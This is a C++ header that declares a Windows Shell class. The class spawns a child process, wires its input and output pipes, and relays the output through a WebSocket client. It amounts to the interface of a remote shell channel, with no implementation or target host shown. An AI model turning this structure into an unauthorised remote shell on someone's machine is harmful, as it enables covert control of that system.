#pragma once

#include <windows.h>
#include <string>
#include <thread>
#include <mutex>
#include <nlohmann/json.hpp>

class WebSocketClient;

class Shell {
public:
    explicit Shell(WebSocketClient& client);
    ~Shell();

    void startShell();
    void stopShell();
    void writeShellInput(const std::string& input);

private:
    void readShellOutput();

    HANDLE hChildStd_IN_Rd = NULL;
    HANDLE hChildStd_IN_Wr = NULL;
    HANDLE hChildStd_OUT_Rd = NULL;
    HANDLE hChildStd_OUT_Wr = NULL;

    PROCESS_INFORMATION piProcInfo = { 0 };
    bool shellRunning = false;
    std::thread outputThread;
    std::mutex shellLock;

    WebSocketClient& client;
};
